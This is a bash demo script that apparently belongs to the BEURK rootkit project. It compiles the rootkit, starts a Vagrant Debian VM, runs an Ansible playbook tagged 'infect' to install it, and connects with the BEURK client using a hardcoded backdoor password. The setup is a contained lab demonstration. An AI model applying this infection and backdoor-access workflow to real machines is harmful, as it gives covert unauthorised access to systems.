#! /usr/bin/env bash
set -o nounset
set -o errexit
set -o pipefail

# arg1: url git
# arg2: name and destination path
function    git_clone()
{
	if [ ! -d "$2" ]; then
		echo "Install $2"
		git clone $1 $2
	elif [ -d "$2/.git" ]; then
		echo "Update $2"
		cd $2; git pull; cd $OLDPWD;
	else
		echo "$2 is not a git repository"
	fi
	echo ""
}

function pause()
{
	if [ $# -eq 0 ]; then
		read -p 'Press [Enter] key to continue the demo...'
	else
		read -p "$*"
	fi
}

git_clone git@github.com:unix-thrust/beurk-vagrant.git beurk-vagrant

echo "STEP 1: Compile"
make
pause

cd beurk-vagrant

echo "STEP 2: Launch VM"
vagrant up --no-provision debian8
pause

echo "STEP 3: Infect VM"
read -p "**CARREFUL** Do you shure you want to infect the VM ? [yY/nN]" yn
case $yn in
    [yY]* ) ansible-playbook -i .vagrant/provisioners/ansible/inventory/vagrant_ansible_inventory -k --user vagrant --tags infect ansible/playbook.yml;;
    * ) echo "Skip...";;
esac
pause

cd $OLDPWD

echo "STEP 5: Connect to the VM with BEURK client"
# do weird stuff
echo "You can connect to the VM with normal user: vagrant ssh debian8."
python ./client.py 127.0.0.1 3005 64835 b3urkR0cks
pause

#cleanup
echo "STEP 6: Cleanup"
make distclean
